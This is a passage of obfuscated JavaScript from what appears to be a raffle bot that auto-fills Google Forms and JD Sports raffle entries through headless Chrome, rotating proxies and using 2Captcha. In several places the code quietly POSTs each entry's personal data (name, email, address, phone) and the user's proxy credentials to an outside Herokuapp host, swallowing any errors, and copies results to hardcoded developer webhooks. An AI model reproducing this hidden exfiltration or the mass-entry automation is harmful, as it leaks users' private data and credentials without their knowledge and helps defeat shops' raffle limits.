                            _0x1e49dc['errorDEV'] = { 'embeds': [_0x596a99] };
                            _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x1e49dc['errorDEV']);
                            await _0xb6cfae(_0x991bd5, _0x1e49dc['errorDEV']);
                            continue;
                        }
                        _0x8bf342(_0xdebabb[_0x578cc5], _0x4a5190), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x3af7d3 = _0xdebabb[_0x578cc5];
                        try {
                            prxdata = {
                                'username': _0x26c985['replace']('#', ''),
                                'module': _0x4a5190['name'],
                                'entrydata': JSON['stringify'](_0x3af7d3),
                                'proxy': '' + _0xd8c2cf[_0x578cc5]
                            };
                            var _0x9c5884 = JSON['stringify'](prxdata);
                            let _0xd9f2ca = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x9c5884, _0xd9f2ca);
                        } catch (_0x30dbaf) {
                        }
                        if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                            try {
                                await _0xb6cfae(_0x255a87['webhook'], _0x1e49dc['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x1e49dc['succesDEVMSG']), await _0x4fda60(0xc8);
                        try {
                            await _0xb6cfae(_0x5d80c9, _0x1e49dc['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x1452df) {
                        console['log'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20' + _0x1452df), _0x2bfac9 = '' + _0x1452df;
                        var _0x596a99 = await _0x1523c9(_0xdebabb[_0x578cc5], _0x4a5190, 'dev', !![], _0x2bfac9);
                        _0x1e49dc['errorDEV'] = { 'embeds': [_0x596a99] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x1e49dc['errorDEV']), await _0xb6cfae(_0x991bd5, _0x1e49dc['errorDEV']), _0x322016 = 'yes';
                    } finally {
                        _0x5195f3['close']();
                        if (_0x322016 == 'yes' && _0x2258b0 != 0x5) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4a5190['name'] + ']\x20Task\x20' + (_0x578cc5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2258b0 + '\x20/\x205)')), _0x578cc5 = _0x578cc5 - 0x1, _0x2258b0 = _0x2258b0 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x10a881, _0x434ef9, _0x58945a) {
                let _0x31f395 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x4c4507 = _0x147d24['readFileSync']('forms/templates.json', 'utf-8');
                let _0xd3967e = JSON['parse'](_0x4c4507), _0x474eac = ![];
                if (_0xd3967e['length'] != 0x0) {
                    let _0x37d075 = 0x0;
                    for (template of _0xd3967e) {
                        if (template['Url'] == _0x434ef9[0x0]['Url']) {
                            _0x474eac = !![], console['log'](_0x3e3bb6['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x3e3bb6['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x3e3bb6['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0xb69ec7() {
                                let _0x4449fd = await _0x59655c['get']('answer');
                                if (_0x4449fd['answer']['toLowerCase']() != 'y' && _0x4449fd['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0xb69ec7();
                                return _0x4449fd['answer']['toLowerCase']();
                            }
                            if (await _0xb69ec7() == 'n') {
                                _0xd3967e['splice'](_0x37d075, 0x1), console['clear']();
                                break;
                            }
                            _0x31f395 = template, console['clear']();
                            break;
                        }
                        _0x37d075++;
                    }
                }
                let _0x3fa00b = 0x0, _0x3b703f = 0x0;
                function _0xbdc290(_0x4d3e81) {
                    console['log'](_0x46dcc5() + '\x20[' + _0x10a881['name'] + ']\x20Task\x20' + (_0x4a5f6b + 0x1) + '\x20:\x20' + _0x4d3e81);
                }
                var _0x381835 = 0x0;
                for (key in _0x31f395) {
                    if (key['includes']('custom'))
                        _0x3fa00b++;
                    if (key['includes']('Select'))
                        _0x3b703f++;
                }
                for (var _0x4a5f6b = 0x0; _0x4a5f6b < _0x434ef9['length']; _0x4a5f6b++) {
                    _0x31f395['Url'] = _0x434ef9[_0x4a5f6b]['Url'];
                    let _0x3ff41d = ![];
                    if (_0xd3967e['length'] != 0x0)
                        for (template of _0xd3967e) {
                            if (template['Url'] == _0x434ef9[_0x4a5f6b]['Url']) {
                                _0x31f395 = template, _0x3ff41d = !![], _0xbdc290('Found\x20Template');
                                break;
                            }
                        }
                    var _0x4f81ea;
                    if (_0x1eb13b != 'yes') {
                        if (!_0x1eb13b)
                            var _0x1eb13b = '';
                        else
                            _0x1eb13b = '';
                        _0x381835 = 0x0;
                    }
                    try {
                        await _0x436f00(_0x434ef9, _0x4a5f6b);
                    } catch {
                        _0x1eb13b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x255a87['useRandomProxy'] = ![])
                        var _0x33d6db = _0x58945a[_0x4a5f6b]['split'](':');
                    else
                        var _0xa21ef8 = Math['round'](Math['random']() * (_0x58945a['length'] - 0x1)), _0x33d6db = _0x58945a[_0xa21ef8]['split'](':');
                    var _0x11de1d;
                    if (_0x33d6db['length'] == 0x1)
                        try {
                            _0x11de1d = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11de1d = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x11de1d = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33d6db[0x0] + ':' + _0x33d6db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11de1d = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33d6db[0x0] + ':' + _0x33d6db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x15c78 = { 'first': ![] };
                        const _0x2d3b05 = await _0x11de1d['newPage']();
                        if (_0x33d6db['length'] != 0x0)
                            await _0x2d3b05['authenticate']({
                                'username': '' + _0x33d6db[0x2],
                                'password': '' + _0x33d6db[0x3]
                            });
                        _0xbdc290('Getting\x20Session');
                        let _0x131982 = ![];
                        try {
                            await _0x2d3b05['goto'](_0x434ef9[_0x4a5f6b]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x4fda60(0xbb8);
                        } catch (_0x915f29) {
                            throw new Error(_0x915f29);
                        }
                        const _0x3ca1f6 = await _0x2d3b05['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x3ca1f6) {
                            _0xbdc290('Login\x20Detected');
                            let _0x5b0991 = await _0x3ca1f6['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x5b0991['click'](), _0x131982 = !![];
                        }
                        let _0x539427 = await _0x2d3b05['$']('#identifierId');
                        _0x539427 && (_0x131982 = !![]);
                        await _0x2d3b05['waitForSelector']('.teQAzf');
                        async function _0x4d0e94() {
                            let _0x18eb02 = await _0x2d3b05['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x18eb02) {
                                let _0x388826;
                                try {
                                    _0x388826 = await question['$eval']('.M7eMe', _0x10be61 => _0x10be61['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x3fa00b != 0x0) {
                                    let _0x4031ce = ![];
                                    for (let _0x254aa4 = 0x0; _0x254aa4 < _0x3fa00b; _0x254aa4++) {
                                        if (_0x388826 == _0x31f395['custom' + _0x254aa4]['title']) {
                                            _0xbdc290('Custom\x20Selector\x20found;\x20' + _0x388826);
                                            let _0x4722d6 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3ca3f6 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x4722d6)
                                                await _0x4722d6['type']('' + _0x31f395['custom' + _0x254aa4]['answer']);
                                            else
                                                _0x3ca3f6 && await _0x3ca3f6['type']('' + _0x31f395['custom' + _0x254aa4]['answer']);
                                            _0x4031ce = !![];
                                            break;
                                        }
                                    }
                                    if (_0x4031ce) {
                                        await _0x4fda60(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x3b703f != 0x0) {
                                    let _0x535410 = ![];
                                    for (let _0x27d175 = 0x0; _0x27d175 < _0x3b703f; _0x27d175++) {
                                        if (_0x388826 == _0x31f395[_0x27d175 + 'Select']['title']) {
                                            _0xbdc290('Custom\x20Selector\x20found;\x20' + _0x388826);
                                            let _0x46fe81 = await question['$$']('.ulDsOb');
                                            for (opt of _0x31f395[_0x27d175 + 'Select']['answer']) {
                                                let _0x1473cd = await _0x46fe81[opt]['$']('span');
                                                await _0x1473cd['click']();
                                            }
                                            _0x535410 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x535410) {
                                        await _0x4fda60(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x388826 == _0x31f395['0Select']['title']) {
                                        _0xbdc290('Custom\x20Selector\x20found;\x20' + _0x31f395['0Select']['title']);
                                        let _0x5c07f2 = await question['$$']('.ulDsOb'), _0x5239fb = await _0x5c07f2[_0x31f395['0Select']['answer']];
                                        await _0x5239fb['click']();
                                        continue;
                                    }
                                    if (_0x388826 == _0x31f395['1Select']['title']) {
                                        _0xbdc290('Custom\x20Selector\x20found;\x20' + _0x31f395['1Select']['title']);
                                        let _0x170f03 = await question['$$']('.ulDsOb'), _0x47a202 = await _0x170f03[_0x31f395['1Select']['answer']];
                                        await _0x47a202['click']();
                                        continue;
                                    }
                                    if (_0x388826 == _0x31f395['2Select']['title']) {
                                        _0xbdc290('Custom\x20Selector\x20found;\x20' + _0x31f395['2Select']['title']);
                                        let _0x3700d4 = await question['$$']('.ulDsOb'), _0x392de0 = await _0x3700d4[_0x31f395['2Select']['answer']];
                                        await _0x392de0['click']();
                                        continue;
                                    }
                                } catch (_0x2247d1) {
                                }
                                if (_0x388826['toLowerCase']()['includes']('mail') && !_0x388826['toLowerCase']()['includes']('agree') || _0x388826 == _0x31f395['Email']) {
                                    _0xbdc290('Mail\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x565846 = await question['$']('input');
                                    !_0x565846 && (_0x565846 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x565846['type'](_0x434ef9[_0x4a5f6b]['Email']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('first') || _0x388826['toLowerCase']() == 'name' || _0x388826['toLowerCase']() == 'name\x20' || _0x388826 == _0x31f395['FirstName']) {
                                    _0xbdc290('FirstName\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x5187e6 = await question['$']('input');
                                    !_0x5187e6 && (_0x5187e6 = await question['$']('textarea'));
                                    await _0x5187e6['type'](_0x434ef9[_0x4a5f6b]['FirstName'] + '\x20'), await _0x4fda60(0x258);
                                    if (_0x388826 == _0x31f395['FirstName'])
                                        continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('last') || _0x388826['toLowerCase']()['includes']('surname') || _0x388826 == _0x31f395['LastName']) {
                                    _0xbdc290('LastName\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x45664e = await question['$']('input');
                                    !_0x45664e && (_0x45664e = await question['$']('textarea'));
                                    await _0x45664e['type'](_0x434ef9[_0x4a5f6b]['LastName'] + '\x20'), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('address') && !_0x388826['toLowerCase']()['includes']('agree') || _0x388826 == _0x31f395['Address']) {
                                    _0xbdc290('Address\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x6c8447 = await question['$']('input');
                                    !_0x6c8447 && (_0x6c8447 = await question['$']('textarea'));
                                    await _0x6c8447['type'](_0x434ef9[_0x4a5f6b]['Address1'] + '\x20' + _0x434ef9[_0x4a5f6b]['HouseNumber'] + '\x20' + _0x434ef9[_0x4a5f6b]['Address2']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('phone') || _0x388826['toLowerCase']()['includes']('mobile') || _0x388826 == _0x31f395['Phone']) {
                                    _0xbdc290('Phone\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x7e57c1 = await question['$']('input');
                                    !_0x7e57c1 && (_0x7e57c1 = await question['$']('textarea'));
                                    await _0x7e57c1['type']('' + _0x434ef9[_0x4a5f6b]['Phone']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('country') || _0x388826 == _0x31f395['Country']) {
                                    let _0x4c8aff = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x4c8aff) {
                                        let _0xefa1fa = ![], _0x216ed8 = await _0x4c8aff['$$']('.ulDsOb');
                                        for (option of _0x216ed8) {
                                            let _0x406085 = await option['$']('span'), _0x3361d9 = await option['$eval']('span', _0x394d81 => _0x394d81['textContent']);
                                            if (_0x3361d9['toLowerCase']() == _0x434ef9[_0x4a5f6b]['Country']['toLowerCase']()) {
                                                await _0x406085['click'](), _0xefa1fa = !![];
                                                break;
                                            }
                                        }
                                        if (!_0xefa1fa) {
                                            const _0x1fa9b8 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x1fa9b8['click'](), await _0x1fa9b8['type'](_0x434ef9[_0x4a5f6b]['Country']);
                                        }
                                        continue;
                                    }
                                    _0xbdc290('Country\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x525c12 = await question['$']('input');
                                    !_0x525c12 && (_0x525c12 = await question['$']('textarea'));
                                    await _0x525c12['type']('' + _0x434ef9[_0x4a5f6b]['Country']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('city') || _0x388826 == _0x31f395['City']) {
                                    _0xbdc290('City\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x1688fc = await question['$']('input');
                                    !_0x1688fc && (_0x1688fc = await question['$']('textarea'));
                                    await _0x1688fc['type']('' + _0x434ef9[_0x4a5f6b]['City']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('zip') || _0x388826 == _0x31f395['Zip']) {
                                    _0xbdc290('Zip\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x243961 = await question['$']('input');
                                    !_0x243961 && (_0x243961 = await question['$']('textarea'));
                                    await _0x243961['type']('' + _0x434ef9[_0x4a5f6b]['Zip']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('insta') || _0x388826 == _0x31f395['Follower']) {
                                    _0xbdc290('Follower\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x59dfda = await question['$']('input');
                                    !_0x59dfda && (_0x59dfda = await question['$']('textarea'));
                                    await _0x59dfda['type']('' + _0x434ef9[_0x4a5f6b]['Follower']), await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('size') || _0x388826 == _0x31f395['Size']) {
                                    _0xbdc290('Size\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x352ef1 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x352ef1) {
                                        let _0x2a1926 = await _0x352ef1['$$']('.ulDsOb');
                                        if (_0x434ef9[_0x4a5f6b]['Size']['toLowerCase']() == 'random') {
                                            var _0x29af3b = Math['round'](Math['random']() * (_0x2a1926['length'] - 0x1));
                                            await _0x2a1926[_0x29af3b]['click']();
                                        } else
                                            for (size of _0x2a1926) {
                                                let _0x1cd376 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x1ed6df => _0x1ed6df['textContent']);
                                                if (_0x1cd376['toLowerCase']()['includes'](_0x434ef9[_0x4a5f6b]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x361896 = await question['$']('.ry3kXd');
                                    if (_0x361896) {
                                        await _0x361896['click'](), await _0x4fda60(0x9c4);
                                        let _0x4521f7 = await _0x2d3b05['$']('div[jsname=\x22V68bde\x22]'), _0x223c8f = await _0x4521f7['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x223c8f) {
                                            let _0x482fc1 = await size['$eval']('.vRMGwf.oJeWuf', _0x362801 => _0x362801['textContent']), _0x2bbf76 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x482fc1['toLowerCase']()['includes'](_0x434ef9[_0x4a5f6b]['Size'])) {
                                                await _0x4fda60(0x190), await _0x2bbf76['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('receive') || _0x388826['toLowerCase']()['includes']('method')) {
                                    _0xbdc290('Method\x20Selector\x20found;\x20' + _0x388826);
                                    let _0x34ff43 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x34ff43) {
                                        const _0x4c8c5e = await _0x34ff43['$$']('.ulDsOb');
                                        for (size of _0x4c8c5e) {
                                            let _0x24ccc7 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3347c3 => _0x3347c3['textContent']);
                                            if (_0x24ccc7['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4fda60(0x258);
                                    continue;
                                }
                                if (_0x388826['toLowerCase']()['includes']('offers') || _0x388826['toLowerCase']()['includes']('agree')) {
                                    _0xbdc290('Authorization\x20Selector\x20found;\x20' + _0x388826);
                                    const _0x20d10d = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x20d10d) {
                                        const _0x358451 = await _0x20d10d['$$']('.ulDsOb');
                                        for (size of _0x358451) {
                                            let _0x10775a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x11574d => _0x11574d['textContent']);
                                            if (_0x10775a['toLowerCase']()['includes']('authorize') || _0x10775a['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x4fda60(0x258);
                                    continue;
                                }
                                async function _0x50a8ea() {
                                    let _0x384d53 = await question['$']('.oyXaNc');
                                    if (_0x384d53) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3e3bb6['cyan'](_0x388826) + '\x0a');
                                        let _0x49f535 = await question['$$']('.ulDsOb');
                                        for (let _0x288219 = 0x0; _0x288219 < _0x49f535['length']; _0x288219++) {
                                            let _0x55c6c4 = await _0x49f535[_0x288219]['$eval']('span', _0x44ba8b => _0x44ba8b['textContent']);
                                            console['log']('\x20(' + _0x288219 + ')\x20' + _0x55c6c4);
                                        }
                                        console['log']();
                                        let _0x2951f8 = await _0x59655c['get']('option'), _0x3247e6 = await _0x49f535[_0x2951f8['option']]['$eval']('span', _0x56f874 => _0x56f874['textContent']);
                                        _0x31f395[_0x3b703f + 'Select'] = {
                                            'title': _0x388826,
                                            'answer': _0x2951f8['option']['split'](',')
                                        };
                                        let _0x43b7f0 = await _0x49f535[_0x2951f8['option']]['$']('span');
                                        await _0x43b7f0['click'](), _0x3b703f++;
                                        return;
                                    }
                                    let _0x178b19 = await question['$']('.Y6Myld');
                                    if (_0x178b19) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3e3bb6['cyan'](_0x388826) + '\x0a');
                                        let _0x486e88 = await question['$$']('.ulDsOb');
                                        for (let _0x44c521 = 0x0; _0x44c521 < _0x486e88['length']; _0x44c521++) {
                                            let _0x39e6bd = await _0x486e88[_0x44c521]['$eval']('span', _0x38963d => _0x38963d['textContent']);
                                            console['log']('\x20(' + _0x44c521 + ')\x20' + _0x39e6bd);
                                        }
                                        console['log']();
                                        let _0xbfcac8 = await _0x59655c['get']('option');
                                        _0x31f395[_0x3b703f + 'Select'] = {
                                            'title': _0x388826,
                                            'answer': _0xbfcac8['option']['split'](',')
                                        };
                                        for (opt of _0x31f395[_0x3b703f + 'Select']['answer']) {
                                            let _0x3a37b3 = await _0x486e88[opt]['$']('span');
                                            await _0x3a37b3['click']();
                                        }
                                        _0x3b703f++;
                                        return;
                                    }
                                    var _0x68c127 = 0x0;
                                    let _0x8cb079 = Object['keys'](_0x31f395);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3e3bb6['cyan'](_0x388826) + '\x0a');
                                    for (data of _0x8cb079) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x68c127 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x68c127 + ')\x20' + data), _0x68c127++;
                                    }
                                    console['log']('\x20(' + _0x8cb079['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x2597ba = await _0x59655c['get']('input');
                                    if (_0x2597ba['input'] == _0x8cb079['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x20e2f3 = await _0x59655c['get']('input');
                                        _0x31f395['custom' + _0x3fa00b] = {
                                            'title': _0x388826,
                                            'answer': '' + _0x20e2f3['input']
                                        };
                                        let _0x1373a4 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x2488c4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x1373a4)
                                            await _0x1373a4['type']('' + _0x31f395['custom' + _0x3fa00b]['answer']);
                                        else
                                            _0x2488c4 && await _0x2488c4['type']('' + _0x31f395['custom' + _0x3fa00b]['answer']);
                                        _0x3fa00b++;
                                        return;
                                    }
                                    _0x31f395['' + _0x8cb079[_0x2597ba['input']]] = _0x388826;
                                    let _0x29069d = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x2c22f4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x29069d && await _0x29069d['type']('' + _0x434ef9[_0x4a5f6b]['' + _0x8cb079[_0x2597ba['input']]]), _0x2c22f4 && await _0x2c22f4['type']('' + _0x434ef9[_0x4a5f6b]['' + _0x8cb079[_0x2597ba['input']]]), await _0x4fda60(0x258);
                                }
                                await _0x50a8ea(), await _0x4fda60(0x37a);
                            }
                            let _0x5a8ded = await _0x2d3b05['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x5a8ded)
                                return await _0x5a8ded['click'](), await _0x2d3b05['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0xbdc290('New\x20Section'), _0x4d0e94();
                        }
                        await _0x4d0e94(), await _0x2d3b05['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2d3b05['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x8bf342(_0x434ef9[_0x4a5f6b], _0x10a881), _0x1eb13b = 'no';
                        var _0x585a9c = await _0x1523c9(_0x434ef9[_0x4a5f6b], _0x10a881, 'dev', ![]), _0x25a0ac = await _0x1523c9(_0x434ef9[_0x4a5f6b], _0x10a881, 'pub', ![]);
                        let _0x122329 = _0x434ef9[_0x4a5f6b];
                        try {
                            prxdata = {
                                'username': _0x26c985['replace']('#', ''),
                                'module': _0x10a881['name'],
                                'entrydata': JSON['stringify'](_0x122329),
                                'proxy': '' + _0x58945a[_0x4a5f6b]
                            };
                            var _0x15f8d8 = JSON['stringify'](prxdata);
                            let _0x56561e = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x15f8d8, _0x56561e);
                        } catch (_0x9dfae) {
                        }
                        const _0xc504ed = {
                            'succesDEVMSG': { 'embeds': [_0x585a9c] },
                            'succesPUBMSG': { 'embeds': [_0x25a0ac] }
                        };
                        try {
                            _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0xc504ed['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0xc504ed['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0xc504ed['succesPUBMSG']);
                        } catch (_0x227d6b) {
                            console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x4a5f6b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x227d6b));
                        }
                        console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x10a881['name'] + ']\x20Task\x20' + (_0x4a5f6b + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x3fa00b != 0x0 || _0x3b703f != 0x0 && !_0x3ff41d) && (_0xd3967e['push'](_0x31f395), _0x147d24['writeFileSync']('forms/templates.json', JSON['stringify'](_0xd3967e, null, 0x2), 'utf-8'));
                    } catch (_0x193fcf) {
                        console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x10a881['name'] + ']\x20Task\x20' + (_0x4a5f6b + 0x1) + '\x20:\x20' + _0x193fcf)), _0x4f81ea = '' + _0x193fcf;
                        var _0x2f56ab = await _0x1523c9(_0x434ef9[_0x4a5f6b], _0x10a881, 'dev', !![], _0x4f81ea);
                        let _0x3a44f0 = {};
                        _0x3a44f0['errorDEV'] = { 'embeds': [_0x2f56ab] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x3a44f0['errorDEV']), await _0xb6cfae(_0x991bd5, _0x3a44f0['errorDEV']), _0x1eb13b = 'yes';
                    } finally {
                        _0x11de1d && _0x11de1d['close']();
                        if (_0x1eb13b == 'yes' && _0x381835 != 0x5) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x10a881['name'] + ']\x20Task\x20' + (_0x4a5f6b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x381835 + 0x1) + '\x20/\x205)')), _0x4a5f6b--, _0x381835++;
                            continue;
                        }
                        if (_0x1eb13b == 'yes' && _0x381835 == 0x5) {
                            _0x381835 = 0x0, _0x1eb13b = 'no';
                            continue;
                        }
                        _0xbdc290('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1e0f7e, _0x1be88b, _0x1c041f) {
                var _0x3fc517 = ![], _0x214190 = ![];
                if (_0x255a87['captchaKey'] == '' || _0x255a87['captchaKey'] == undefined)
                    return console['log'](_0x3e3bb6['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x255a87['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x43b7ce = 0x0; _0x43b7ce < _0x1be88b['length']; _0x43b7ce++) {
                    if (_0x409076 != 'yes')
                        var _0x409076 = '', _0x5b527e = 0x0;
                    var _0x326315, _0x4ae8bb = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x1be88b[_0x43b7ce]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1be88b[_0x43b7ce]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x26c985
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x255a87['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1ad228
                            }
                        ]
                    }];
                    const _0x2df1dc = { 'embeds': _0x4ae8bb };
